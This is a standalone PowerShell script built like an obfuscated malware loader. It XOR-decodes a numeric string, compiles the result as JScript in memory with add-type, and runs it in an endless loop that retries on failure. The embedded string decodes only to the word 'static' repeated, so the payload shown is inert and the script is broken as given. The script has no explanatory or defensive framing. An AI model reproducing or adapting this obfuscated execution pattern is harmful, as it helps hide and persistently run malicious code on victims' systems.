function Xor-Decode {
    param ([string]$EncodedText)

    $key = [int][char]'o'
    $result = ""

    $clean = ($EncodedText -replace "`r|`n", "")

    for ($i = 0; $i -lt $clean.Length; $i += 3) {
        $num = [int]$clean.Substring($i, 3)
        $result += [char]($num -bxor $key)
    }

    return $result
}

$src = "079079079079028027014027006012079079079079028027014027006012079079079079028027014027006012"

$dec = Xor-Decode $src
while($true) {
    try {
        $jsc = (add-type -language JScript -MemberDefinition $dec -PassThru -Name 'jsc35')[1]
        $jsc::run()
    }
    catch {
        $jsc = (add-type -language JScript -MemberDefinition $dec -PassThru -Name 'jsc36')[1]
        $jsc::run()
    }
}
